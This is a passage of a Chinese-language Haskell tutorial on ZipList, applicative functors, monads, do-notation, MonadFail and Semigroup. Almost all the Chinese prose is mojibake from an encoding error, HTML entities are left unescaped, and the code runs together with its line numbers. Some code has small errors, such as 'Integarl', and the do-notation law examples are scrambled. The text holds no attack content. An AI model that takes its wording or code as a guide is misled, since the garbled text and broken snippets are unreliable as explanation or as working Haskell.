ZipListæ™®é€šåˆ—è¡¨å®ç°çš„&lt;*&gt;å‡½æ•°æ˜¯å°†æ¯ä¸ªå‡½æ•°åº”ç”¨åœ¨æ‰€æœ‰å€¼ä¸Šï¼Œä½†è¿˜æœ‰ä¸€ç§å®ç°æ–¹æ³•æ˜¯å°†æ¯ä¸ªå‡½æ•°åº”ç”¨åœ¨å¯¹åº”å€¼ä¸Šï¼Œå› ä¸ºåŒä¸€ä¸ªç±»å‹ä¸èƒ½å­˜åœ¨åŒä¸€å‡½æ•°çš„ä¸¤ç§å®ç°å½¢å¼ï¼Œæ‰€ä»¥å¼•å…¥äº†ä¸€ä¸ªæ–°çš„åˆ—è¡¨ZipListï¼ŒåŒ…å«åœ¨Control.Applicativeæ¨¡å—ä¸­ 123instance Applicative ZipList where pure x = ZipList (repeat x) ZipList fs &lt;*&gt; ZipList xs = ZipList (zipWith ($) fs xs) ä½†æ˜¯ZipListå¹¶ä¸æ˜¯Showçš„å®ä¾‹ï¼Œæ‰€ä»¥ä¸èƒ½ç›´æ¥æ˜¾ç¤ºå‡ºæ¥ï¼Œè¦ä½¿ç”¨getZipListæ¥è·å–å®ƒå†…éƒ¨çš„åˆ—è¡¨ï¼š 1234ghci&gt; getZipList $ (+) &lt;$&gt; ZipList [1,2,3] &lt;*&gt; ZipList [100,100..] [101,102,103]ghci&gt; getZipList $ (,,) &lt;$&gt; ZipList &quot;dog&quot; &lt;*&gt; ZipList &quot;cat&quot; &lt;*&gt; ZipList &quot;rat&quot; [('d','c','r'),('o','a','a'),('g','t','t')] Applicative Functor Lawsåº”ç”¨å‡½å­ä¸€èˆ¬æœ‰å››ä¸ªå®šå¾‹ï¼Œéƒ½æ˜¯ä¿è¯pureçš„æ­£ç¡®æ€§çš„ï¼š Identity lawï¼špure id &lt;*&gt; v = v Homomorphismï¼špure f &lt;*&gt; pure x = pure (f x) Interchangeï¼šu &lt;*&gt; pure v = pure ($ v) &lt;*&gt; u Compositionï¼šu &lt;*&gt; (v &lt;*&gt; w) = pure (.) &lt;*&gt; u &lt;*&gt; v &lt;*&gt; w Intuitionç†è§£åº”ç”¨å‡½å­çš„æ–¹å¼ä¹Ÿæ˜¯å°†å…¶çœ‹ä½œæ˜¯è®¡ç®—ä¸Šä¸‹æ–‡ï¼ˆcontextï¼‰ï¼Œæ¯”å¦‚è¦è®¡ç®—ï¼š$$[[\\ \\ g\\ x_1\\ x_2\\ \\cdots\\ x_n\\ \\ ]]$$ å…¶ä¸­$x_i$çš„ç±»å‹æ˜¯$f\\ t_i$ï¼Œ$f$æ˜¯åº”ç”¨å‡½å­ï¼ˆçœ‹ä½œä¸Šä¸‹æ–‡ï¼‰ã€‚è€Œå‡½æ•°$g$çš„ç±»å‹æ˜¯ï¼š $$t_1\\to t_2\\to\\cdots\\to t_n\\to t$$ æ‰€ä»¥åŒæ‹¬å·ï¼ˆidiom bracketsï¼‰çš„ä½œç”¨æ˜¯å°†ä¸€ä¸ªæ™®é€šå‡½æ•°åº”ç”¨åœ¨åŒ…å«åœ¨ä¸Šä¸‹æ–‡ä¸­çš„å‚æ•°ä¸Šã€‚$g\\ x_1$å¯ä»¥é€šè¿‡fmapæ¥æ‰§è¡Œï¼Œå°†$g$æå‡ï¼ˆliftï¼‰åˆ°$x_1$çš„ä¸Šä¸‹æ–‡ä¸­ï¼Œç„¶ååº”ç”¨åœ¨$x_1$ä¸Šã€‚ä½†æ˜¯fmapè¿”å›çš„ç»“æœæ˜¯ä¸€ä¸ªå‡½å­ï¼Œæ¢å¥è¯è¯´ï¼Œ$g\\ x_1$ç»“æœçš„ç±»å‹æ˜¯ï¼š $$f\\ \\ (t_2\\to t_3\\to\\cdots\\to t_n\\to t)$$ ä½†æ˜¯fmapå¹¶ä¸èƒ½å°†ä¸Šä¸‹æ–‡ä¸­çš„å‡½æ•°åº”ç”¨åœ¨ä¸Šä¸‹æ–‡ä¸­çš„å‚æ•°ä¸Šï¼Œäºæ˜¯åº”ç”¨å‡½å­çš„&lt;*&gt;å‡½æ•°æä¾›äº†è¿™ä¸ªæ–¹æ³•ï¼Œæ‰€ä»¥è®¡ç®—$[[\\ g\\ x_1\\ x_2\\ \\cdots\\ x_n\\ ]]$ï¼Œåªéœ€è¦ï¼š g x1 x2 ... xn è€Œpureå‡½æ•°çš„ä½œç”¨å°±æ˜¯å°†ä¸€ä¸ªä¸åœ¨ä¸Šä¸‹æ–‡ä¸­çš„å€¼ï¼ˆå‡½æ•°æˆ–å‚æ•°ï¼‰æå‡åˆ°ä¸Šä¸‹æ–‡ä¸­ï¼Œä½†ä¸è¿›è¡Œå…¶ä»–æ“ä½œã€‚æ¯”å¦‚å‚æ•°$x_2$å¦‚æœä¸åœ¨ä¸Šä¸‹æ–‡ä¸­ï¼Œéœ€è¦ç”¨pureæå‡åˆ°ä¸Šä¸‹æ–‡ä¸­æ‰èƒ½æŒ‰ä¸Šé¢è®¡ç®—ï¼š g x1 pure x2 ... xn å¸¸ç”¨å‡½æ•°liftA &amp; liftA2 &amp; liftA3liftA :: Applicative f => (a -> b) -> f a -> f b liftA2 :: Applicative f => (a -> b -> c) -> f a -> f b -> f c liftA3 :: Applicative f => (a -> b -> c -> d) -> f a -> f b -> f c -> f d ä¸éš¾æ¨æµ‹liftAå°±æ˜¯fmapï¼ŒliftA2 f x1 x2ç›¸å½“äºf &lt;$&gt; x1 &lt;*&gt; x2ï¼ŒliftA3 f x1 x2 x3ç›¸å½“äºf &lt;$&gt; x1 &lt;*&gt; x2 &lt;*&gt; x3 &lt;* &amp; *&gt;ç±»å‹ç±»ä¼¼å‡½å­çš„&lt;$å’Œ$&gt;ï¼š (&lt;*) :: Applicative f => f a -> f b -> f a (*>) :: Applicative f => f a -> f b -> f b &lt;*æ¥æ”¶ä¸¤ä¸ªå‡½å­ï¼Œå¦‚æœä¸¤ä¸ªå‡½å­ä¸­åˆä¸€ä¸ªä¸ºç©ºï¼Œå°±è¿”å›ç©ºï¼Œå¦åˆ™è¿”å›çš„ç±»å‹ä¸ç¬¬ä¸€ä¸ªå‡½å­ç›¸åŒã€‚*&gt;åè¿‡æ¥ 12345678910111213141516ghci&gt; Just 3 &lt;* Just 4Just 3ghci&gt; Just 3 *&gt; Just 4Just 4ghci&gt; Nothing &lt;* Just 3Nothingghci&gt; Nothing *&gt; Just 3Nothingghci&gt; [1, 2, 3] &lt;* [3, 4][1,1,2,2,3,3]ghci&gt; [1, 2, 3] *&gt; [3, 4][3,4,3,4,3,4]ghci&gt; [] &lt;* [1, 2, 3][]ghci&gt; [] *&gt; [1, 2, 3][] &lt;**&gt;(**) :: Applicative f => f a -> f (a -> b) -> f b æ¥æ”¶çš„å‚æ•°æ˜¯&lt;*&gt;åè½¬è¿‡æ¥çš„ï¼Œå³å…ˆæ¥æ”¶ä¸€ä¸ªå‚æ•°å‡½å­ï¼Œç„¶åæ¥æ”¶ä¸€ä¸ªå‡½æ•°å‡½å­ï¼Œåœ¨å°†å…¶åº”ç”¨è¿”å›ã€‚ä½†æ˜¯å’Œflip(&lt;*&gt;)ä¸åŒï¼Œå®ƒå…ˆå–å‚æ•°å‡½å­çš„æ¯ä¸ªå‚æ•°ï¼Œç„¶åå†å–å‡½æ•°å‡½å­ä¸­çš„å‡½æ•°é€ä¸ªåº”ç”¨ï¼š 123456ghci&gt; [(+1), (+2), (+3)] &lt;*&gt; [1, 2][2,3,3,4,4,5]ghci&gt; [1, 2] &lt;**&gt; [(+1), (+2), (+3)][2,3,4,3,4,5]ghci&gt; flip(&lt;*&gt;) [1, 2] [(+1), (+2), (+3)][2,3,3,4,4,5] when &amp; unlesswhen :: Applicative f => Bool -> f () -> f () ä¼ å…¥çš„ç¬¬ä¸€ä¸ªæ˜¯ä¸€ä¸ªç»“æœä¸ºBoolç±»å‹çš„æµ‹è¯•ï¼Œå¦‚æœæµ‹è¯•ä¸ºTrueï¼Œåˆ™è°ƒç”¨ç¬¬äºŒä¸ªå‚æ•°ï¼Œå¦åˆ™è¿”å›pure ()ã€‚ï¼ˆwhenå‡½æ•°åœ¨ä¸Šæ–‡IOæ“ä½œä¸­ä½¿ç”¨è¿‡ï¼‰ unlessåˆ™ä¸whenç›¸åï¼Œæµ‹è¯•ä¸ºTrueè¿”å›pure () sequenceAsequenceA :: (Traversable t, Applicative f) => t (f a) -> f (t a) åº”ç”¨åœ¨åˆ—è¡¨ä¸Šæ—¶ï¼Œå®ƒçš„ç±»å‹ç›¸å½“äºï¼š [f a] -> f [a] æ‰€ä»¥åœ¨åˆ—è¡¨ä¸Šå®ƒçš„ä½¿ç”¨æ–¹æ³•ï¼š 12345678910ghci&gt; sequenceA [Just 3, Just 2, Just 1] Just [3,2,1] ghci&gt; sequenceA [Just 3, Nothing, Just 1] Nothing ghci&gt; sequenceA [(+3),(+2),(+1)] 3 [6,5,4] ghci&gt; sequenceA [[1,2,3],[4,5,6]] [[1,4],[1,5],[1,6],[2,4],[2,5],[2,6],[3,4],[3,5],[3,6]] ghci&gt; sequenceA [[1,2,3],[4,5,6],[3,4,4],[]] [] å®ƒåœ¨å¯¹åŒä¸€ä¸ªå‚æ•°åº”ç”¨ä¸åŒå‡½æ•°æ—¶å¾ˆæœ‰ç”¨ï¼š 1234ghci&gt; map (\\f -&gt; f 7) [(&gt;4), (&lt;10), odd] [True,True,True] ghci&gt; sequenceA [(&gt;4), (&lt;10), odd] 7 [True,True,True] Monadå•å­ï¼ˆMonadï¼‰æ˜¯å¯¹Applicative Functorçš„æ‰©å±•ï¼ˆä½†æ˜¯è¯ç”Ÿæ¯”Applicativeæ—©ï¼‰ï¼ŒFunctorçš„&lt;$&gt;å‡½æ•°å®ç°äº†å°†æ™®é€šå‡½æ•°åº”ç”¨åœ¨ä¸Šä¸‹æ–‡å€¼ä¸Šï¼ŒApplicativeçš„&lt;*&gt;å‡½æ•°å°†ä¸Šä¸‹æ–‡ä¸­å‡½æ•°åº”ç”¨åœ¨ä¸Šä¸‹æ–‡å€¼ä¸Šã€‚è€ŒMonadæä¾›äº†ä¸€ä¸ªå‡½æ•°&gt;&gt;=ï¼ˆbindï¼‰ï¼Œå°†ä¸€ä¸ªæ¥æ”¶æ™®é€šå€¼è¿”å›ä¸Šä¸‹æ–‡å€¼çš„å‡½æ•°åº”ç”¨åœ¨ä¸Šä¸‹æ–‡å€¼ä¸Šï¼š 123456class Applicative m =&gt; Monad m where (&gt;&gt;=) :: m a -&gt; (a -&gt; m b) -&gt; m b (&gt;&gt;) :: m a -&gt; m b -&gt; m b return :: a -&gt; m a m &gt;&gt; n = m &gt;&gt;= \\_ -&gt; n return = pure returnå‡½æ•°ï¼šå’Œpureä¸€æ ·ï¼Œåªæ˜¯æœ‰å¦ä¸€ä¸ªåå­— &gt;&gt;å‡½æ•°ï¼šæä¾›äº†é»˜è®¤çš„å®ç°æ–¹æ³•ï¼Œå®ƒçš„ä½œç”¨å’ŒApplicativeçš„*&gt;å‡½æ•°ä¸€æ · &gt;&gt;=å‡½æ•°ï¼ˆbindï¼‰ï¼šæ¯”Applicativeå‡çº§çš„å‡½æ•°ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ä¸€ä¸ªå•å­ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯ä¸€ä¸ªæ¥æ”¶å€¼è¿”å›å•å­çš„å‡½æ•°ï¼Œå°†è¿™ä¸ªå‡½æ•°åº”ç”¨åœ¨ç¬¬ä¸€ä¸ªå‚æ•°å•å­ä¸­çš„å€¼ä¸Šï¼Œå¹¶è¿”å›å¾—åˆ°çš„æ–°å•å­ Monadå®ä¾‹MaybeMaybeæ˜¯ä¸€ä¸ªå•å­å®ä¾‹ï¼ŒApplicativeå·²ç»ä¸ºå®ƒå®ç°äº†returnï¼Œå› æ­¤åªéœ€è¦&gt;&gt;=å‡½æ•°ï¼š 123instance Monad Maybe where (Just x) &gt;&gt;= f = f x Nothing &gt;&gt;= _ = Nothing æ ¹æ®å®šä¹‰å°±å¾ˆå®¹æ˜“å®ç°Maybeçš„&gt;&gt;=å‡½æ•°äº†ï¼Œè€Œä¸”ä¹Ÿå¾ˆå¥½ç†è§£ 12345678ghci&gt; Just 1 &gt;&gt;= \\x -&gt; Just (x + 1)Just 2ghci&gt; Just 1 &gt;&gt;= \\x -&gt; return (x + 1)Just 2ghci&gt; Nothing &gt;&gt;= \\x -&gt; Just (x + 1)Nothingghci&gt; Just 1 &gt;&gt;= \\x -&gt; Just (x + 1) &gt;&gt; Nothing &gt;&gt;= \\y -&gt; Just (y + 1)Nothing æœ€åä¸€ä¸ªä¾‹å­ä¸­å‡ºç°äº†&gt;&gt; Nothingï¼Œè¿™æ—¶Nothingå‰çš„éƒ¨åˆ†å…¨éƒ½ç›¸å½“äºæ²¡ç”¨ï¼Œå› ä¸º&gt;&gt;æ“ä½œç¬¦çš„å·¦å³ä¸¤è¾¹åªè¦æœ‰ä¸€ä¸ªå‡ºç°Nothingï¼Œé‚£æ•´ä½“å°±ä¼šæ˜¯Nothingã€‚è¿™ä¸ªç‰¹æ€§å¯ä»¥ç”¨äºåœ¨ä¸­é€”éšæ—¶åˆ¤æ–­å¤±è¯¯ï¼Œåªè¦æœ‰ä¸€å¤„å¤±è¯¯ï¼Œç»“æœå°±ä¼šæ˜¯Nothing []åˆ—è¡¨ä¹Ÿæ˜¯ä¸€ä¸ªå•å­ï¼š 12instance Monad [] where xs &gt;&gt;= f = concat (map f xs) å°†è¿™ä¸ªå‡½æ•°åº”ç”¨åœ¨xsçš„æ¯ä¸ªå€¼ä¸Šï¼Œå°†è¿”å›çš„æ‰€æœ‰åˆ—è¡¨å¹³é“ºæˆä¸€ä¸ªåˆ—è¡¨ï¼š 1234ghci&gt; [3,4,5] &gt;&gt;= \\x -&gt; [x,-x] [3,-3,4,-4,5,-5] ghci&gt; [1,2] &gt;&gt;= \\n -&gt; ['a','b'] &gt;&gt;= \\ch -&gt; return (n,ch) [(1,'a'),(1,'b'),(2,'a'),(2,'b')] IOIOä¹Ÿæ˜¯ä¸€ä¸ªå•å­ï¼Œä½†æ˜¯å®ç°æ–¹æ³•æ¯”è¾ƒæ·±å¥¥ï¼ˆé€ƒ (-&gt;) r(-&gt;) rä¹Ÿæ˜¯ä¸€ä¸ªå•å­ï¼Œå’ŒFunctorã€Applicativeä¸€æ ·ï¼Œå…ˆåˆ†æå®ƒçš„&gt;&gt;=ç±»å‹ç­¾åï¼š (>>=) :: (-> r) a -> (a -> (-> r) b) -> (-> r) b (>>=) :: (r -> a) -> (a -> r -> b) -> (r -> b) ä¹Ÿå¯ä»¥çœ‹å‡ºæ¥ï¼Œå®ƒæ¥æ”¶ä¸¤ä¸ªå‡½æ•°f :: r -&gt; aã€g :: a -&gt; r -&gt; bï¼Œç„¶åè¿”å›ä¸€ä¸ªæ–°çš„å‡½æ•°h :: r -&gt; b é‚£ä¹ˆå‡½æ•°hæ¥æ”¶ä¸€ä¸ªç±»å‹ä¸ºrçš„å‚æ•°ï¼Œè¿”å›ä¸€ä¸ªç±»å‹ä¸ºbçš„å€¼ã€‚æ‰€ä»¥å…ˆå¯¹è¾“å…¥åº”ç”¨få¾—åˆ°ç±»å‹ä¸ºaçš„ä¸­é—´å€¼ï¼Œç„¶åå†å°†è¿™ä¸ªå€¼å’Œè¾“å…¥å‚æ•°ä¸€èµ·ä¼ å…¥å‡½æ•°gå¾—åˆ°ç»“æœã€‚æ‰€ä»¥å‡½æ•°hçš„å®šä¹‰åº”è¯¥æ˜¯ï¼š \\x -> g (f x) x 12instance Monad ((-&gt;) r) where f &gt;&gt;= g = \\x -&gt; g (f x) x 1234ghci&gt; (+3) &gt;&gt;= (+) $ 15ghci&gt; (+) &lt;$&gt; (+3) &lt;*&gt; id $ 15 do-notationHaskellçš„doè¯­å¥ä¸ºé“¾å¼çš„&gt;&gt;=åº”ç”¨æä¾›äº†ç±»ä¼¼å‘½ä»¤å¼ï¼ˆimperative styleï¼‰çš„è¯­æ³•ç³–ã€‚æ¯”å¦‚a &gt;&gt;= \\x -&gt; b &gt;&gt; c &gt;&gt;= \\y -&gt; dï¼š 1234a &gt;&gt;= \\x -&gt;b &gt;&gt;c &gt;&gt;= \\y -&gt;d å…¶ä¸­æœ‰abcdå››ä¸ªå€¼ï¼Œå¯ä»¥çœ‹å‡ºaä¸­å†…å®¹ç»‘å®šåˆ°äº†xä¸Šï¼Œcä¸­å†…å®¹ç»‘å®šåˆ°äº†yä¸Šã€‚ä½¿ç”¨doè¯­å¥æ¥è¡¨ç¤ºè¿™ä¸ªæ“ä½œå¯ä»¥å†™æˆï¼š 12345do { x &lt;- a ; b ; y &lt;- c ; d } å…¶ä¸­çš„å¤§æ‹¬å·å’Œåˆ†å·å¯ä»¥çœç•¥ä¸å†™ï¼ˆæŒ¤åœ¨ä¸€è¡Œæ—¶ä¸èƒ½çœç•¥ï¼‰ã€‚doè¯­å¥ä¹Ÿåªæ˜¯ä¸€ä¸ªè¯­æ³•ç³–ï¼Œå®ƒå¯ä»¥é€’å½’åœ°è½¬æ¢æˆæ™®é€šçš„Monadæ“ä½œè¯­å¥ï¼š do eï¼še do { e; ... }ï¼še &gt;&gt; do { â€¦ } do { v &lt;- e; ... }ï¼še &gt;&gt;= \\v -&gt; do { â€¦ } do { let ...; ... }ï¼šlet â€¦ in do { â€¦ } ApplicativeDoæ¯”å¦‚å¦‚ä¸‹ä¸€ä¸ªdoè¯­å¥ï¼š 1234do x &lt;- a y &lt;- b z &lt;- c return (f x y z) å®ƒå¯ä»¥è½¬åŒ–æˆï¼š a >>= \\x -> b >>= \\y -> c >>= \\z -> return (f x y z) ä½†æ˜¯ç»è¿‡è§‚å¯Ÿå¯ä»¥å‘ç°ï¼Œæ•´ä¸ªè¯­å¥å®é™…ä¸Šå°†å‡½æ•°fåº”ç”¨åœ¨äº†ä¸‰ä¸ªä¸Šä¸‹æ–‡ä¸­çš„å€¼ä¸Šï¼Œæ‰€ä»¥ä»…ç”¨Applicativeçš„&lt;$&gt;å’Œ&lt;*&gt;å®Œå…¨å¯ä»¥å®ç°ï¼š f a b c è€Œä¸”åœ¨è¿è¡Œçš„æ—¶å€™Applicativeçš„æ•ˆç‡ä¼šæ¯”Monadé«˜ï¼Œæ‰€ä»¥Haskellä¼šå°†doè¯­å¥å°½å¯èƒ½ä¼˜å…ˆè½¬æ¢ä¸ºApplicativeçš„è¡¨ç¤ºæ–¹æ³•ç„¶åå†è®¡ç®— Monad Laws Left identityï¼š return a &gt;&gt;= k = k a Right identityï¼šm &gt;&gt;= return = m Associativityï¼š(m &gt;&gt;= g) &gt;&gt;= h = m &gt;&gt;= (\\x -&gt; g x &gt;&gt;= h) å‰ä¸¤ä¸ªå®šå¾‹å¾ˆå¥½ç†è§£ï¼š å°†aæ³¨å…¥ä¸Šä¸‹æ–‡ä¹‹åç»‘å®šï¼ˆbindï¼‰ç»™å‡½æ•°k(:: a -&gt; m a)ï¼Œç›¸å½“äºç›´æ¥å°†aç›´æ¥ä¼ å…¥å‡½æ•°k å°†å·²ç»åŒ…å«åœ¨ä¸Šä¸‹æ–‡ä¸­çš„å€¼ç»‘å®šç»™returnå‡½æ•°ï¼Œç›¸å½“äºä¿æŒä¸å˜ ç¬¬ä¸‰ä¸ªå®šå¾‹æ˜¯ç»“åˆå¾‹ï¼ŒæŠŠå®ƒå†™æˆæ›´åƒç»“åˆå¾‹çš„è¡¨ç¤ºæ–¹æ³•æ˜¯ï¼š (m >>= (\\x -> g x)) >>= h = m >>= (\\x -> g x >>= h) ç»„åˆè¿ç®—ç¬¦ï¼ˆ&gt;=&gt;ï¼‰å½¢å¼Control.Monadæ¨¡å—ä¸­è¿˜å®šä¹‰äº†å‡½æ•°&gt;=&gt;ï¼ˆKleisli-composition operatorï¼‰ï¼š 123infixr 1 &gt;=&gt;(&gt;=&gt;) :: Monad m =&gt; (a -&gt; m b) -&gt; (b -&gt; m c) -&gt; (a -&gt; m c)f &gt;=&gt; g = \\x -&gt; f x &gt;&gt;= g ä½¿ç”¨&gt;=&gt;è¿ç®—ç¬¦å¯ä»¥å°†ä¸¤ä¸ªç”¨äºç»‘å®šçš„å‡½æ•°ç»“åˆåœ¨ä¸€èµ·ã€‚ç”¨å®ƒè¡¨ç¤ºçš„Monadå®šå¾‹æ›´åŠ æ¸…æ™°ç›´è§‚ï¼š Left identityï¼šreturn &gt;=&gt; f = f Right identityï¼šf &gt;=&gt; return = f Associativityï¼š(f &gt;=&gt; g) &gt;=&gt; h = f &gt;=&gt; (g &gt;=&gt; h) do-notationå½¢å¼Monadçš„è¿™ä¸‰ä¸ªå®šå¾‹è¿˜å¯ä»¥ä½¿ç”¨doè¯­å¥æ¥æè¿°ï¼š Left identityï¼š 123do { x' &lt;- return x; f x' = do { f x } } Right identityï¼š 123do { x &lt;- m; return x = do { m } } Associativityï¼š 12345do { y &lt;- do { x &lt;- m; do { x &lt;- m; do { x &lt;- m; f x do { y &lt;- f x; y &lt;- f x; } = g y = g y g y } } } } IntuitionMonadä¹Ÿå¯ä»¥å¾ˆè‡ªç„¶åœ°çœ‹æˆApplicativeçš„å‡çº§ç‰ˆï¼Œæ¯”å¦‚Applicativeçš„æ“ä½œå…¨éƒ¨æ˜¯å›ºå®šçš„ï¼Œè€ŒMonadçš„æ“ä½œå¯ä»¥åœ¨ä¸­é€”çªç„¶æ”¹å˜ åŒæ—¶Monadä¹Ÿå®Œæˆäº†Functorå’ŒApplicativeæ— æ³•å®Œæˆçš„æ“ä½œã€‚æ¯”å¦‚è¦ç”¨fmapå’Œå®ç°&gt;&gt;=å‡½æ•°ï¼ˆå³è¾¾æˆæ“ä½œ m a -&gt; (a -&gt; m b) -&gt; m bï¼‰ï¼Œå…ˆå‡è®¾ f :: a -&gt; m bï¼Œé‚£ä¹ˆfmap fçš„ç±»å‹å°±ä¼šæ˜¯ m a -&gt; m (m b)ï¼Œå°†m aåº”ç”¨åœ¨fmap fä¸Šä¼šå¾—åˆ°ç»“æœm (m b)ï¼Œè€Œä¸æ˜¯m bã€‚ä½†æ˜¯ç›®å‰åªå¯ä»¥ä½¿ç”¨pureå°†ä¸€ä¸ªå€¼è£…å…¥ä¸Šä¸‹æ–‡ä¸­ï¼ˆa -&gt; m aï¼‰ï¼Œè€Œæ²¡æœ‰ä¸€ä¸ªå‡½æ•°å¯ä»¥ä»ä¸Šä¸‹æ–‡ä¸­æå–å€¼ï¼ˆm a -&gt; aï¼‰ã€‚é‚£ä¹ˆå°±éœ€è¦å®šä¹‰ä¸€ä¸ªæ–°çš„å‡½æ•°æ¥å®ç°è¿™ä¸ªæ“ä½œçš„æ•ˆæœï¼ˆm (m b) -&gt; m bï¼‰ã€‚å› æ­¤Monadçš„å¦ä¸€ä¸ªç­‰æ•ˆçš„å®šä¹‰æ–¹æ³•æ˜¯ï¼š 12345class Applicative m =&gt; Monad' m where join :: m (m a) -&gt; m a (&gt;&gt;=) :: m a -&gt; (a -&gt; m b) -&gt; m b x &gt;&gt;= f = join $ fmap f x ä½†æ˜¯\bå®šä¹‰&gt;&gt;=å‡½æ•°ä¼šæ›´ä¸ºç›´è§‚æ–¹ä¾¿ï¼Œæ‰€ä»¥Haskellé‡‡ç”¨äº†ç”¨&gt;&gt;=å‡½æ•°å®šä¹‰Monadçš„æ–¹æ³• åŒæ—¶Haskellè¿˜æä¾›äº†joinå‡½æ•°çš„å®šä¹‰ï¼š 12join :: Monad m =&gt; m (m a) -&gt; m a join x = x &gt;&gt;= id å¸¸ç”¨å‡½æ•°liftM &amp; apliftM :: Monad m => (a -> b) -> m a -> m b ap :: Monad m => m (a -> b) -> m a -> m b æ‰€ä»¥liftMå…¶å®å°±æ˜¯fmapã€apå°±æ˜¯&lt;*&gt;ï¼Œä½†æ˜¯è€ç‰ˆæœ¬çš„GHCå®šä¹‰Monadå¹¶æ²¡æœ‰Functorã€Applicativeçš„çº¦æŸï¼Œæ‰€ä»¥å®ç°äº†liftMã€apï¼Œå¹¶ä¸”ä¿ç•™äº†è¿™ä¸ªåå­— å› æ­¤ä¸€ä¸ªå•å­ä¹Ÿå¯ä»¥é€šè¿‡pure = returnã€(&lt;*&gt;) = apç›´æ¥æˆä¸ºåº”ç”¨å‡½å­çš„å®ä¾‹ sequencesequence :: Monad m => [m a] -> m [a] sequenceçš„ä½œç”¨æ˜¾è€Œæ˜“è§ï¼Œè€Œä¸”åœ¨IOéƒ¨åˆ†ä¹Ÿä½¿ç”¨åˆ°äº†ã€‚ä½†æ˜¯è¿™ä¸ªç‰ˆæœ¬æ˜¯åœ¨GHC.Baseæ¨¡å—ä¸­å®šä¹‰çš„ï¼Œè¿˜æœ‰ä¸€ä¸ªæ›´å¹¿æ³›çš„ä½¿ç”¨Traversableçš„å®šä¹‰åœ¨Data.Traversableæ¨¡å—ä¸­ replicateMreplicateM :: Applicative m => Int -> m a -> m [a] mapM &amp; forMmapM :: Monad m => (a -> m b) -> [a] -> m [b] forM :: Monad m => [a] -> (a -> m b) -> m [b] forMçš„ç”¨æ³•åœ¨IOéƒ¨åˆ†å·²ç»è¯´è¿‡ï¼ŒmapMå’ŒforMéƒ½åœ¨Data.Traversableæ¨¡å—ä¸­æœ‰å¹¿æ³›ç‰ˆæœ¬ è¿˜æœ‰ä¸€äº›å…¶ä»–çš„å‡½æ•°ï¼šfilterMã€zipWithMã€foldMã€foreverï¼Œé€šè¿‡åå­—å°±å¯ä»¥çœ‹å‡ºç”¨æ³•ï¼Œæ˜¯å°†åŸæ¥ä»…ä½¿ç”¨ä¸åˆ—è¡¨çš„å‡½æ•°æå‡è‡³å¯ä»¥é€‚ç”¨äºæ‰€æœ‰å•å­ å¹¶ä¸”åœ¨å‡½æ•°åååŠ ä¸‹åˆ’çº¿ï¼Œæ¯”å¦‚sequence_ã€mapM_ï¼Œä¼šå¿½ç•¥è¿”å›å€¼ï¼ˆæœ€ç»ˆç»“æœä¸ºm ()ï¼‰ =&lt;&lt; &amp; &gt;=&gt; &amp; &lt;=&lt;ï¼ˆ&gt;=&gt;æ“ä½œç¬¦åœ¨ä¸Šé¢Monad Lawséƒ¨åˆ†å·²ç»ç»™å‡ºäº†å®šä¹‰ï¼‰ x &gt;&gt;= f = f =&lt;&lt; x f &gt;=&gt; g = g &lt;=&lt; f MonadFailMonadFailå®šä¹‰åœ¨Control.Monad.Failæ¨¡å—ä¸­ï¼š 12class Monad m =&gt; MonadFail m where fail :: String -&gt; m a å®ƒåªè¦æ±‚åœ¨Monadçš„åŸºç¡€ä¸Šå®ç°failå‡½æ•°ï¼Œæ¥æ”¶ä¸€ä¸ªå­—ç¬¦ä¸²è¿”å›ä¸€ä¸ªå•å­ã€‚è¿™ä¼šä½¿åœ¨doè¯­å¥ä¸­äº§ç”Ÿé”™è¯¯æ—¶ç›´æ¥å˜ä¸ºé”™è¯¯å€¼ï¼ˆç©ºå€¼ï¼‰ä½¿æœ€ç»ˆçš„è¿”å›å€¼ä¸ºé”™è¯¯å€¼ MonadFailå®ä¾‹12345678instance MonadFail Maybe where fail _ = Nothinginstance MonadFail [] where fail _ = []instance MonadFail IO where fail = failIO Maybeå’Œ[]çš„failå‡½æ•°éƒ½ä¸ç¬¬ä¸€ä¸ªå‚æ•°æ— å…³ï¼Œç›´æ¥è¿”å›ç©ºå€¼ï¼ˆNothingã€[]ï¼‰ï¼›è€ŒIOçš„failå‡½æ•°ç›´æ¥ä½¿ç”¨failIOï¼Œå®ç°æ–¹æ³•ä¹Ÿæ˜¯æ·±å¥¥ï¼ˆæ¥ç€é€ƒ 1234567exampleFail :: Maybe Char exampleFail = do (x:xs) &lt;- Just &quot;&quot; return x ghci&gt; exampleFailNothing åœ¨è¿™ä¸ªä¾‹å­çš„doè¯­å¥ä¸­ï¼Œåœ¨æå–Just â€œâ€ä¸­çš„å€¼æ—¶ç”¨äº†æ¨¡å¼åŒ¹é…ï¼Œä½†æ˜¯å› ä¸ºå…¶å†…å®¹ä¸ºç©ºå­—ç¬¦ä¸²ï¼Œx:xsåŒ¹é…ä¼šå‡ºç°é”™è¯¯ï¼Œè¿™æ—¶å°±ä¼šè§¦å‘failå‡½æ•°ç›´æ¥è¿”å›Nothing MonadFail Law fail s &gt;&gt;= m = fail s SemigroupåŠç¾¤ï¼ˆsemigroupï¼‰æ˜¯ä¸€ä¸ªé›†åˆ$S$ï¼Œå®ƒéœ€è¦æŒ‡å®šä¸€ä¸ªäºŒå…ƒè¿ç®—ç¬¦$\\oplus$ï¼Œå¹¶ä¸”æ»¡è¶³ $$a\\oplus b \\in S\\quad a, b\\in S$$ ä»¥åŠç»“åˆï¼ˆassociativeï¼‰å¾‹ï¼š $$(a\\oplus b)\\oplus c = a\\oplus (b\\oplus c)$$ è¿™ä¸ªäºŒå…ƒè¿ç®—ç¬¦åœ¨Haskellçš„Semigroupä¸­è¢«å®šä¹‰ä¸º&lt;&gt;å‡½æ•°ï¼š 12345678910class Semigroup a where (&lt;&gt;) :: a -&gt; a -&gt; a sconcat :: NonEmpty a -&gt; a sconcat (a :| as) = go a as where go b (c:cs) = b &lt;&gt; go c cs go b [] = b stimes :: Integarl b =&gt; b -&gt; a -&gt; a stimes = ... é™¤æ­¤ä¹‹å¤–è¿˜æœ‰sconcatå’Œstimeså‡½æ•°ï¼Œéƒ½ç»™å‡ºäº†é»˜è®¤å®ç°ã€‚å¯¹äºåˆ—è¡¨ï¼Œ&lt;&gt;ç›¸å½“äº(++)ï¼Œstimesç›¸å½“äºconcat . replicateï¼š 123456ghci&gt; [1, 2] &lt;&gt; [3, 4][1,2,3,4]ghci&gt; sconcat $ fromList [[1, 2], [3, 4]][1,2,3,4]ghci&gt; stimes 3 [1, 2][1,2,1,2,1,2] Semigroup Law (x &lt;&gt; y) &lt;&gt; z 